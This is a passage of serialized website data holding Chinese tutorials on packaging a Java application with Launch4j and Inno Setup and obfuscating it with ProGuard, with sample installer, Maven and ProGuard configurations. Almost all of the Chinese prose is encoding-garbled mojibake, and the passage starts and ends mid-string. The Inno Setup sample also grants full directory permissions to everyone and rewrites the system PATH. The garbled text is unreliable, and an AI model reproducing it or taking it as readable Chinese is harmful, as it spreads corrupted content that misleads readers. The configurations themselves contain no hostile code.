æå®åºç¨ç¨åºçç±»è·¯å¾åå³èç jar æä»¶ï¼ä»¥ç¡®ä¿ä½ ç java åºç¨ç¨åºè½å¤æ­£å¸¸è¿è¡ã\n * èªå¨æ£æµ main-classï¼å®å¯ä»¥èªå¨æ£æµä½ ç jar æä»¶ä¸­ç main-classï¼ä»èæ éæå¨æå®åºç¨ç¨åºçå¥å£ç¹ã\n * æ¯æ jre éé¡¹ï¼ä½ å¯ä»¥éæ©å° jreï¼java è¿è¡æ¶ç¯å¢ï¼æåå°çæçå¯æ§è¡æä»¶ä¸­ï¼ä»èç¨æ·æ éå®è£ jre å³å¯è¿è¡ä½ çåºç¨ç¨åºã\n * è·¨å¹³å°å¼å®¹æ§ï¼çæçå¯æ§è¡æä»¶éå¸¸åªè½å¨ windows ä¸è¿è¡ï¼ä½ launch4j å¯ä»¥å¨ windows ä¸åå»ºç¨äºå¶ä»å¹³å°çåè£å¨ï¼ä¾å¦ linux æ macosã\n\ninno setup æ¬èº«ä¸è½ç´æ¥å° jar æä»¶æåæ exe æä»¶ãæä»¥æä»¬è¦åä½¿ç¨ launch4j æ jar æåæä¸ä¸ª exe æ ¼å¼çå¯æ§è¡ç¨åºãinno setup æ¯ä¸ä¸ªåè´¹çå¼æºå®è£å¶ä½å·¥å·ï¼å®éµå¾ªè®¸å¯è¯åè®¸åè´¹ä½¿ç¨ï¼åæ¬åä¸ç¨éãinno setup çä¸»è¦ä½ç¨æ¯åå»ºç¨äºå®è£åå¸è½½ windows åºç¨ç¨åºçå®è£ç¨åºãå®ç½å°å\n\ninno setup åè½æï¼\n\n * åå»ºèªå®ä¹å®è£ç¨åºï¼inno setup åè®¸å¼åäººååå»ºå®å¶çãæäºä½¿ç¨çå®è£ç¨åºï¼ç¨äºå°ä»ä»¬çåºç¨ç¨åºé¨ç½²å° windows æä½ç³»ç»ä¸ãä½ å¯ä»¥å®ä¹å®è£è¿ç¨çåä¸ªæ¹é¢ï¼åæ¬æä»¶å¤å¶ãæ³¨åè¡¨é¡¹ãå¿«æ·æ¹å¼ãå¼å§èåé¡¹ç­ã\n * æ¯æå¤ç§å®è£ä»»å¡ï¼inno setup æ¯æåç§åæ ·çå®è£ä»»å¡ï¼åæ¬ç®åçæä»¶å¤å¶ï¼æ³¨åè¡¨è®¾ç½®ï¼åå»ºå¿«æ·æ¹å¼ï¼ä»¥åæ§è¡èªå®ä¹èæ¬åä»»å¡ãè¿ä½¿å¾ä½ å¯ä»¥è½»æ¾å°èªå®ä¹å®è£è¿ç¨ï¼ä»¥æ»¡è¶³ä½ çåºç¨ç¨åºçç¹å®éæ±ã\n * èæ¬åï¼inno setup ä½¿ç¨åºäºèæ¬çè¯­è¨æ¥å®ä¹å®è£è¿ç¨ãè¿æå³çä½ å¯ä»¥ç¼åèæ¬æ¥æè¿°å®è£ç¨åºçè¡ä¸ºï¼ä½¿å¶éå¸¸çµæ´»ãinno setup ä½¿ç¨ç±»ä¼¼äº pascal çèæ¬è¯­è¨ã\n * å¤è¯­è¨æ¯æï¼inno setup æ¯æå¤ç§è¯­è¨ï¼åè®¸ä½ ä¸ºä¸åçç¨æ·ç¾¤ä½åå»ºå¤è¯­è¨å®è£ç¨åºï¼ä»¥æä¾æ¬å°åçå®è£åå¸è½½ä½éªã\n * å¸è½½æ¯æï¼inno setup ä¸ä»å¯ä»¥åå»ºå®è£ç¨åºï¼è¿å¯ä»¥çæå¸è½½ç¨åºï¼åè®¸ç¨æ·ä»ä»ä»¬çè®¡ç®æºä¸å¸è½½ä½ çåºç¨ç¨åºã\n\n\n# ä½¿ç¨ launch4j\n\nlaunch4j æ jar åè£æ .exe ç¨åºè¿æ¯ææå±éçï¼æ¯å¦å¯å¨æ¹å¼åªè½æ¯ java -jarï¼å¦æéåæ··æ·å°±æ²¡æåæ³\n\n\n# basic\n\nå¨è¿ééç½®è·¯å¾ç­ä¿¡æ¯\n\n\n\noutput file: å¡«åæ jar ææ.exe ç¨åºçè¾åºè·¯å¾\njarï¼éæ©èªå·±è¦æåç jar\n\n\n# jre\n\nå¨è¿ééç½® jvmï¼jdk çæ¬ç­ä¿¡æ¯\n\n\n\njre pathsï¼ä¸éè¦æä»¬å¡«\nmin jre versionï¼æä½ jdk çæ¬\nmax jre versionï¼æé« jdk çæ¬\njvm optionï¼è®¾ç½® jvm å¯å¨åæ°\n\n\n# console\n\nè®¾ç½® console\n\n\n\n# ä½¿ç¨ inno setup\n\ninno setup è¿æ¯æäºé¾åº¦çï¼éè¦å­¦ä¹ éé¢çåä¸ªå³é®å­ï¼åè°ï¼äºä»¶ç­ï¼æè½ææ¡ inno setup çä½¿ç¨\n\nä»¥ä¸è´´ä¸ä¸ªç®åç inno setup ç¤ºä¾\n\n;éç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸º\n[setup]\n; åºç¨åç§°\nappname=easy-manager-tool\n; åºç¨çæ¬\nappversion=1.0\n; é»è®¤å®è£ç®å½ {pf}ä¸º program files è¿ä¸ªè·¯å¾æ¯ç±»ä¼¼äº c:\\program files çå½¢å¼\ndefaultdirname={pf}\\emt\n; åºç¨è¾åºå°æä»¶è·¯å¾\noutputdir=c:\\users\\user\\desktop\\tool\\gen\n; è¾åºæä»¶çåç§°\noutputbasefilename=emt\n; æå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°\napppublisher=\n; åºç¨ç¨åºåå¸èçç½ç«æurl\napppublisherurl=\n\n; åå»ºç®å½ {app} å½è¡¨åºç¨æå¨çè·¯å¾\n[dirs]\nname: "{app}\\go"; permissions: everyone-full\n\n; æ·»å æä»¶\n[files]\nsource: "c:\\users\\user\\desktop\\build\\*"; destdir: "{app}"; flags: ignoreversion recursesubdirs createallsubdirs\n\n; æ³¨åè¡¨\n[registry]\nroot: hklm; subkey: "system\\currentcontrolset\\control\\session manager\\environment"; valuetype: string; valuename: "path"; valuedata: "{olddata};{app}\\jdk\\bin"\n\n; è¿è¡èæ¬\n[run]\nfilename: "{sys}\\cmd.exe"; parameters: "/c setx path ""{app}\\go\\bin;%path%"""; flags: runasoriginaluser; statusmsg: "setting path for go..."; check: not is64bitinstallmode\nfilename: "{app}\\runbuild.bat"; description: "runbuild.bat";\nfilename: "cmd.exe"; parameters: "/c setx path ""%path%;{app}\\jdk\\bin"" /m"; flags: runhidden; workingdir: {app}; statusmsg: "updating path environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# setup\n\nç¨äºéç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸ºãå¨ [setup] é¨åä¸­ï¼ä½ å¯ä»¥æå®åç§å®è£ç¨åºçå±æ§ï¼ä¾å¦åºç¨ç¨åºåç§°ãçæ¬å·ãå®è£ç®å½ãè¾åºç®å½ç­ãä»¥ä¸æ¯ [setup] å¯ä»¥æè¿°çä¸äºéè¦åå®¹ï¼\n\n * appnameï¼è¿ä¸ªéé¡¹ç¨äºæå®å®è£ç¨åºçåºç¨ç¨åºåç§°ãå®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºç»ç¨æ·ï¼éå¸¸ç¨äºå¨å¼å§èåãå¸è½½é¡¹ç­ä½ç½®æ¾ç¤ºåºç¨ç¨åºçåç§°ã\n * appversionï¼ç¨äºå®ä¹å®è£ç¨åºççæ¬å·ãè¿å¯ä»¥æ¯ä½ çåºç¨ç¨åºçå®éçæ¬å·ï¼ä»¥å¸®å©ç¨æ·äºè§£å®è£çåå®¹ã\n * defaultdirnameï¼æå®é»è®¤çå®è£ç®å½ãå¯ä»¥ä½¿ç¨é¢å®ä¹çå¸¸éï¼å¦ {pf} ä»£è¡¨ program files ç®å½ï¼ï¼æèæå®ä¸ä¸ªå·ä½çè·¯å¾ã\n * outputdirï¼å®ä¹çæå®è£ç¨åºçè¾åºç®å½ãè¿æ¯æå®çæçå®è£æä»¶ï¼éå¸¸æ¯ .exe æä»¶ï¼å°è¢«ä¿å­çä½ç½®ã\n * outputbasefilenameï¼æå®çæçå®è£ç¨åºçæä»¶åï¼éå¸¸æ¯ä¸ä¸ª .exe æä»¶ãè¿å°æ¯ç¨æ·è¿è¡çå®éå®è£ç¨åºæä»¶çåç§°ã\n * apppublisherï¼ç¨äºæå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°ï¼å®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * apppublisherurlï¼å¯ç¨äºæä¾åºç¨ç¨åºåå¸èçç½ç«æ urlï¼è¿ä¹å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * appsupporturlï¼å¯ä»¥åå«æ¯ææå¸®å©ä¿¡æ¯ç urlã\n * appupdatesurlï¼å¦ææå³äºåºç¨ç¨åºæ´æ°çä¿¡æ¯æ urlï¼å¯ä»¥å¨è¿éæå®ã\n * appmutexï¼ç¨äºæå®åºç¨ç¨åºçäºæ¥ä½åç§°ï¼ä»¥ç¡®ä¿å¨å®è£è¿ç¨ä¸­åªè½è¿è¡ä¸ä¸ªå®ä¾ã\n * defaultgroupnameï¼å®ä¹å¼å§èåä¸­åºç¨ç¨åºå¿«æ·æ¹å¼çé»è®¤ç»åã\n * allowuncpathï¼æå®æ¯å¦åè®¸å®è£å° unc è·¯å¾ï¼ç½ç»å±äº«è·¯å¾ï¼ã\n * uninstalldisplayiconï¼å®ä¹å¸è½½ç¨åºçæ¾ç¤ºå¾æ ã\n * uninstalldisplaynameï¼æå®å¸è½½ç¨åºçæ¾ç¤ºåç§°ã\n * uninstallstringï¼å®ä¹å¸è½½ç¨åºçæ§è¡å½ä»¤ã\n\n\n# dirs\n\nç¨äºå®ä¹å¨ç¨æ·è®¡ç®æºä¸åå»ºçç®å½ç»æãéè¿ [dirs] é¨åï¼ä½ å¯ä»¥æå®è¦å¨ç®æ è®¡ç®æºä¸åå»ºçç®å½ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­å°æä»¶å¤å¶å°è¿äºç®å½ä¸­ãä»¥ä¸æ¯ [dirs] å¯ä»¥æè¿°çåå®¹ï¼\n\n 1. ç®å½åç§°ï¼å¨ [dirs] é¨åä¸­ï¼ä½ å¯ä»¥ååºè¦åå»ºçç®å½çåç§°ãè¿äºç®å½åç§°éå¸¸æ¯ç¸å¯¹äºå®è£ç®å½ï¼ç± [setup] é¨åç defaultdirname æå®ï¼çç¸å¯¹è·¯å¾ã\n 2. permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªç®å½æå®æéï¼ä¾å¦è¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·æ¯å¦å¯ä»¥è®¿é®æä¿®æ¹è¿äºç®å½ä¸­çæä»¶ã\n 3. subdirectoriesï¼ä½ å¯ä»¥å®ä¹å­ç®å½ï¼ä»¥ä¾¿å¨ç®å½åå»ºæ¶åæ¶åå»ºå­ç®å½ãè¿æå©äºæå»ºå¤æçç®å½ç»æ\n\n\n# files\n\nç¨äºæå®è¦å¨å®è£è¿ç¨ä¸­åå«çæä»¶åå®ä»¬çå®è£ç®æ ãéè¿ [files] é¨åï¼ä½ å¯ä»¥å®ä¹è¦å¤å¶å°ç®æ è®¡ç®æºä¸çæä»¶ãæä»¶çæºè·¯å¾åæä»¶çç®æ è·¯å¾ï¼ä»¥åå¶ä»æä»¶ç¸å³çå±æ§ãä»¥ä¸æ¯ [files] å¯ä»¥æè¿°çåå®¹ï¼\n\n * sourceï¼è¿ä¸ªå­æ®µæå®äºè¦å¤å¶çæä»¶çæºè·¯å¾ãä½ å¯ä»¥æå®å®æ´çæä»¶è·¯å¾ï¼ä¹å¯ä»¥ä½¿ç¨ééç¬¦æ¥åæ¬å¤ä¸ªæä»¶ã\n * destdirï¼ç¨äºæå®æä»¶çç®æ ç®å½ãè¿æ¯æä»¶å¨ç¨æ·è®¡ç®æºä¸çæç»å®è£ä½ç½®ã\n * destnameï¼æå®æä»¶å¨ç®æ è®¡ç®æºä¸çåç§°ãè¿å¯ä»¥æ¯ä¸æºæä»¶ä¸åçåç§°ã\n * checkï¼è¿ä¸ªå­æ®µåè®¸ä½ å®ä¹æä»¶çæ£æ¥æ¹æ³ï¼ä»¥ç¡®ä¿æä»¶å¨å¤å¶å°ç®æ è®¡ç®æºä¸æ¶æ²¡æè¢«æ´æ¹ææåã\n * permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªæä»¶å®ä¹æéï¼åæ¬æä»¶çè¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·å¯¹æä»¶çè®¿é®æéã\n * attribsï¼åè®¸ä½ ä¸ºæä»¶å®ä¹å±æ§ï¼å¦åªè¯»ãéèç­ã\n * fontinstallï¼å¦æä½ çå®è£ç¨åºåå«å­ä½æä»¶ï¼ä½ å¯ä»¥ä½¿ç¨è¿ä¸ªå­æ®µæ¥å®è£å­ä½æä»¶å¹¶æ³¨åå®ä»¬ã\n * flagsï¼ç¨äºæå®ä¸æä»¶ç¸å³çç¹å®æ å¿ï¼ä¾å¦åå»ºå¿«æ·æ¹å¼ã\n\n\n# registry\n\nç¨äºå¨ windows æ³¨åè¡¨ä¸­åå»ºãä¿®æ¹æå é¤é®åå¼ãéè¿ [registry] é¨åï¼ä½ å¯ä»¥éç½®ä½ çå®è£ç¨åºå¨ç¨æ·è®¡ç®æºä¸åå»ºæ³¨åè¡¨é¡¹ï¼ä»¥å­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ãå³èæä»¶æ©å±ãæä»¶å³èç­ç­ãä»¥ä¸æ¯ [registry] å¯ä»¥æè¿°çåå®¹ï¼\n\n * rootï¼æå®æ³¨åè¡¨é¡¹çæ ¹é®ï¼éå¸¸æ¯ hkey_local_machine æ hkey_current_userãä¸åçæ ¹é®å¯¹åºä¸åçé¨åï¼ä¾å¦ hkey_local_machine ç¨äºç³»ç»èå´çè®¾ç½®ï¼è hkey_current_user ç¨äºå½åç¨æ·çè®¾ç½®ã\n * subkeyï¼æå®æ³¨åè¡¨é¡¹çå­é®è·¯å¾ãè¿æ¯æ³¨åè¡¨ä¸­çç®æ ä½ç½®ã\n * valuenameï¼å®ä¹æ³¨åè¡¨å¼çåç§°ãè¿å¯ä»¥æ¯ä¸ä¸ªå­ç¬¦ä¸²ï¼éå¸¸ç¨äºå­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ã\n * valuetypeï¼æå®æ³¨åè¡¨å¼çç±»åï¼å¦å­ç¬¦ä¸²ãæ´æ°ç­ã\n * valuedataï¼å®ä¹æ³¨åè¡¨å¼çæ°æ®ãè¿æ¯å®éçå¼ï¼å¯ä»¥æ¯ææ¬ãæ°å­ç­ã\n * flagsï¼ç¨äºæå®æ³¨åè¡¨é¡¹åå¼çå±æ§ï¼ä¾å¦åå»ºãå é¤ãè¦çç­ã\n * permissionsï¼ä½ å¯ä»¥å®ä¹æ³¨åè¡¨é¡¹çæéï¼ä»¥ç¡®ä¿åªæå·æéå½æéçç¨æ·æè½è®¿é®æä¿®æ¹æ³¨åè¡¨é¡¹ã\n\n\n# run\n\nç¨äºå¨å®è£è¿ç¨ä¸­æå®è¦è¿è¡çå¯æ§è¡æä»¶ãèæ¬æå¶ä»ç¨åºãéè¿ [run] é¨åï¼ä½ å¯ä»¥éç½®å®è£ç¨åºå¨å®è£å®æåæå¸è½½ç¨åºæ¶æ§è¡çæä½ãä»¥ä¸æ¯ [run] å¯ä»¥æè¿°çåå®¹ï¼\n\n * filenameï¼æå®è¦è¿è¡çæä»¶çè·¯å¾ï¼è¿å¯ä»¥æ¯ä¸ä¸ªå¯æ§è¡æä»¶ï¼.exeï¼ãèæ¬ï¼.batã.cmdã.vbs ç­ï¼æå¶ä»ç¨åºã\n * parametersï¼å®ä¹è¦ä¼ éç»è¿è¡æä»¶çåæ°æå½ä»¤è¡åæ°ãè¿åè®¸ä½ åè¿è¡çç¨åºä¼ éé¢å¤çä¿¡æ¯ã\n * workingdirï¼æå®è¿è¡æä»¶æ¶çå·¥ä½ç®å½ãè¿æ¯è¿è¡æä»¶æå¨çç®å½ã\n * descriptionï¼æä¾ä¸ä¸ªå¯éçæè¿°ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­æ¾ç¤ºæè®°å½æ­¤æä½ã\n * flagsï¼ç¨äºæå®è¿è¡æä½çæ å¿ï¼ä¾å¦æ¯å¦ç­å¾è¿è¡çç¨åºå®æã\n * statusmsgï¼å®ä¹å¨æ§è¡æ­¤æä½æ¶è¦æ¾ç¤ºç»ç¨æ·çç¶ææ¶æ¯ã',charsets:{cjk:!0}},{title:"javaä»£ç æ··æ·ä¹ ProGuard",frontmatter:{title:"javaä»£ç æ··æ·ä¹ ProGuard",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/2.java%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E4%B9%8BProGuard.html",relativePath:"00.è¯­è¨/01.JAVA/04.å¶ä»/2.javaä»£ç æ··æ·ä¹ProGuard.md",key:"v-52ff49bd",path:"/language/java/other/2/",headers:[{level:2,title:"æ·»å ä¾èµ",slug:"æ·»å ä¾èµ",normalizedTitle:"æ·»å ä¾èµ",charIndex:218},{level:2,title:"éç½®ProGuard",slug:"éç½®proguard",normalizedTitle:"éç½® proguard",charIndex:2643}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ·»å ä¾èµ éç½®ProGuard",content:"ProGuard æ¯ä¸ä¸ªç¨äº Java åºç¨ç¨åºçä»£ç æ··æ·åä¼åå·¥å·ï¼éå¸¸ç¨äº Android åºç¨ç¨åºï¼ä½åæ ·éç¨äº Spring Boot åºç¨ç¨åºãæ··æ·ä»£ç å¯ä»¥å¢å¼ºå®å¨æ§ï¼å¹¶åå°åºç¨ç¨åºçä½ç§¯ãä½¿ç¨ proguard æ··æ·ä»£ç åªè½å¢å éè¯»åçè§£çé¾åº¦ï¼å¹¶ä¸è½ç¾åç¾ä¿è¯ä»£ç å®å¨ãä¹å³æ¯è¾¾å°è®©å¼åäººåçå°è¿å¤´ççä»£ç æ 99.99999% çå²å¨æ¾å¼éè¯»ï¼ææ¡å­è¯´è¿ä¸å¦æéåä¸éé»è¾ãä½æ¯å¦æä¸äºéè¦çéææ°æ®ä¾ç¶ä¼æ´æ¼\n\n\n# æ·»å ä¾èµ\n\né¦åï¼ä½ éè¦å¨é¡¹ç®çæå»ºæä»¶ï¼éå¸¸æ¯ build.gradle æ pom.xmlï¼ä¸­æ·»å  ProGuard çä¾èµã\n\n\x3c!-- æ··æ· --\x3e\n<plugin>\n  <groupId>com.github.wvengen</groupId>\n  <artifactId>proguard-maven-plugin</artifactId>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- ä»¥ä¸éç½®è¯´ææ§è¡mvnçpackageå½ä»¤æ¶åï¼ä¼æ§è¡proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  CreateProcess error=206, æä»¶åææ©å±åå¤ªé¿ --\x3e\n    <putLibraryJarsInTempDir>true</putLibraryJarsInTempDir>\n    \x3c!-- å°±æ¯è¾å¥Jarçåç§°ï¼æä»¬è¦ç¥éï¼ä»£ç æ··æ·å¶å®æ¯å°ä¸ä¸ªåå§çjarï¼çæä¸ä¸ªæ··æ·åçjarï¼é£ä¹å°±ä¼æè¾å¥è¾åºã --\x3e\n    <injar>${project.build.finalName}.jar</injar>\n    \x3c!-- è¾åºjaråç§°ï¼è¾å¥è¾åºjarååçæ¶åå°±æ¯è¦çï¼ä¹æ¯æ¯è¾å¸¸ç¨çéç½®ã --\x3e\n    <outjar>${project.build.finalName}.jar</outjar>\n    \x3c!-- æ¯å¦æ··æ· é»è®¤æ¯true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- éç½®ä¸ä¸ªæä»¶ï¼éå¸¸å«åproguard.cfg,è¯¥æä»¶ä¸»è¦æ¯éç½®optionséé¡¹ï¼ä¹å°±æ¯è¯´ä½¿ç¨proguard.cfgé£ä¹optionsä¸çææåå®¹é½å¯ä»¥ç§»å°proguard.cfgä¸­ --\x3e\n    <proguardInclude>${project.basedir}/proguard.cfg</proguardInclude>\n    \x3c!-- é¢å¤çjaråï¼éå¸¸æ¯é¡¹ç®ç¼è¯æéè¦çjar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- å¯¹è¾å¥jarè¿è¡è¿æ»¤æ¯å¦ï¼å¦ä¸éç½®å°±æ¯å¯¹META-INFOæä»¶ä¸å¤çã --\x3e\n    <inLibsFilter>!META-INF/**,!META-INF/versions/9/**.class</inLibsFilter>\n    \x3c!-- è¿æ¯è¾åºè·¯å¾éç½®ï¼ä½æ¯è¦æ³¨æè¿ä¸ªè·¯å¾å¿é¡»è¦åæ¬injaræ ç­¾å¡«åçjar --\x3e\n    <outputDirectory>${project.basedir}/target</outputDirectory>\n    \x3c!--è¿éç¹å«éè¦ï¼æ­¤å¤ä¸»è¦æ¯éç½®æ··æ·çä¸äºç»èéé¡¹ï¼æ¯å¦åªäºç±»ä¸éè¦æ··æ·ï¼åªäºéè¦æ··æ·--\x3e\n    <options>\n      \x3c!-- å¯ä»¥å¨æ­¤å¤åoptionæ ç­¾éç½®ï¼ä¸è¿æä¸é¢ä½¿ç¨äºproguardIncludeï¼æèææ´åæ¬¢å¨proguard.cfgä¸­éç½® --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,æ³¨æä¸å®è¦æ¾å¨æ··æ·æä»¶ä¹å --\x3e\n<plugin>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-maven-plugin</artifactId>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot æåéè¦repackageå¦åä¸æ¯å¯æ§è¡jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainClass>com.aizuda.easyManagerTool.ToolBootApplication</mainClass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# éç½® ProGuard\n\n#æå®Javaççæ¬\n-target 1.8\n#proguardä¼å¯¹ä»£ç è¿è¡ä¼ååç¼©ï¼ä»ä¼å é¤ä»æªä½¿ç¨çç±»æèç±»æååéç­\n-dontshrink\n#æ¯å¦å³é­å­èç çº§å«çä¼åï¼å¦æä¸å¼å¯åè®¾ç½®å¦ä¸éç½®\n-dontoptimize\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n# å¯¹äºç±»æåçå½åçæ··æ·éåå¯ä¸ç­ç¥\n-useuniqueclassmembernames\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n#æ··æ·ç±»åä¹åï¼å¯¹ä½¿ç¨Class.forName('className')ä¹ç±»çå°æ¹è¿è¡ç¸åºæ¿ä»£\n-adaptclassstrings\n\n#å¯¹å¼å¸¸ãæ³¨è§£ä¿¡æ¯äºä»¥ä¿ç\n-keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,*Annotation*,EnclosingMethod\n# æ­¤éé¡¹å°ä¿å­æ¥å£ä¸­çææåå§åç§°ï¼ä¸æ··æ·ï¼--\x3e\n#-keepnames interface ** { *; }\n# æ­¤éé¡¹å°ä¿å­ææè½¯ä»¶åä¸­çææåå§æ¥å£æä»¶ï¼ä¸è¿è¡æ··æ·ï¼\n#-keep interface * extends * { *; }\n#ä¿çåæ°åï¼å ä¸ºæ§å¶å¨ï¼æèMybatisç­æ¥å£çåæ°å¦ææ··æ·ä¼å¯¼è´æ æ³æ¥ååæ°ï¼xmlæä»¶æ¾ä¸å°åæ°\n-keepparameternames\n# ä¿çæä¸¾æååæ¹æ³\n-keepclassmembers enum * { *; }\n# ä¸æ··æ·ææç±»,ä¿å­åå§å®ä¹çæ³¨é-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.Bean *;\n    @org.springframework.beans.factory.annotation.Autowired *;\n    @org.springframework.beans.factory.annotation.Value *;\n    @org.springframework.stereotype.Service *;\n    @org.springframework.stereotype.Component *;\n}\n\n#å¿½ç¥warnæ¶æ¯\n-ignorewarnings\n#å¿½ç¥noteæ¶æ¯\n-dontnote\n#æå°éç½®ä¿¡æ¯\n-printconfiguration\n-keep public class com.aizuda.easyManagerTool.ToolBootApplication {\n        public static void main(java.lang.String[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",normalizedContent:"proguard æ¯ä¸ä¸ªç¨äº java åºç¨ç¨åºçä»£ç æ··æ·åä¼åå·¥å·ï¼éå¸¸ç¨äº android åºç¨ç¨åºï¼ä½åæ ·éç¨äº spring boot åºç¨ç¨åºãæ··æ·ä»£ç å¯ä»¥å¢å¼ºå®å¨æ§ï¼å¹¶åå°åºç¨ç¨åºçä½ç§¯ãä½¿ç¨ proguard æ··æ·ä»£ç åªè½å¢å éè¯»åçè§£çé¾åº¦ï¼å¹¶ä¸è½ç¾åç¾ä¿è¯ä»£ç å®å¨ãä¹å³æ¯è¾¾å°è®©å¼åäººåçå°è¿å¤´ççä»£ç æ 99.99999% çå²å¨æ¾å¼éè¯»ï¼ææ¡å­è¯´è¿ä¸å¦æéåä¸éé»è¾ãä½æ¯å¦æä¸äºéè¦çéææ°æ®ä¾ç¶ä¼æ´æ¼\n\n\n# æ·»å ä¾èµ\n\né¦åï¼ä½ éè¦å¨é¡¹ç®çæå»ºæä»¶ï¼éå¸¸æ¯ build.gradle æ pom.xmlï¼ä¸­æ·»å  proguard çä¾èµã\n\n\x3c!-- æ··æ· --\x3e\n<plugin>\n  <groupid>com.github.wvengen</groupid>\n  <artifactid>proguard-maven-plugin</artifactid>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- ä»¥ä¸éç½®è¯´ææ§è¡mvnçpackageå½ä»¤æ¶åï¼ä¼æ§è¡proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  createprocess error=206, æä»¶åææ©å±åå¤ªé¿ --\x3e\n    <putlibraryjarsintempdir>true</putlibraryjarsintempdir>\n    \x3c!-- å°±æ¯è¾å¥jarçåç§°ï¼æä»¬è¦ç¥éï¼ä»£ç æ··æ·å¶å®æ¯å°ä¸ä¸ªåå§çjarï¼çæä¸ä¸ªæ··æ·åçjarï¼é£ä¹å°±ä¼æè¾å¥è¾åºã --\x3e\n    <injar>${project.build.finalname}.jar</injar>\n    \x3c!-- è¾åºjaråç§°ï¼è¾å¥è¾åºjarååçæ¶åå°±æ¯è¦çï¼ä¹æ¯æ¯è¾å¸¸ç¨çéç½®ã --\x3e\n    <outjar>${project.build.finalname}.jar</outjar>\n    \x3c!-- æ¯å¦æ··æ· é»è®¤æ¯true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- éç½®ä¸ä¸ªæä»¶ï¼éå¸¸å«åproguard.cfg,è¯¥æä»¶ä¸»è¦æ¯éç½®optionséé¡¹ï¼ä¹å°±æ¯è¯´ä½¿ç¨proguard.cfgé£ä¹optionsä¸çææåå®¹é½å¯ä»¥ç§»å°proguard.cfgä¸­ --\x3e\n    <proguardinclude>${project.basedir}/proguard.cfg</proguardinclude>\n    \x3c!-- é¢å¤çjaråï¼éå¸¸æ¯é¡¹ç®ç¼è¯æéè¦çjar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- å¯¹è¾å¥jarè¿è¡è¿æ»¤æ¯å¦ï¼å¦ä¸éç½®å°±æ¯å¯¹meta-infoæä»¶ä¸å¤çã --\x3e\n    <inlibsfilter>!meta-inf/**,!meta-inf/versions/9/**.class</inlibsfilter>\n    \x3c!-- è¿æ¯è¾åºè·¯å¾éç½®ï¼ä½æ¯è¦æ³¨æè¿ä¸ªè·¯å¾å¿é¡»è¦åæ¬injaræ ç­¾å¡«åçjar --\x3e\n    <outputdirectory>${project.basedir}/target</outputdirectory>\n    \x3c!--è¿éç¹å«éè¦ï¼æ­¤å¤ä¸»è¦æ¯é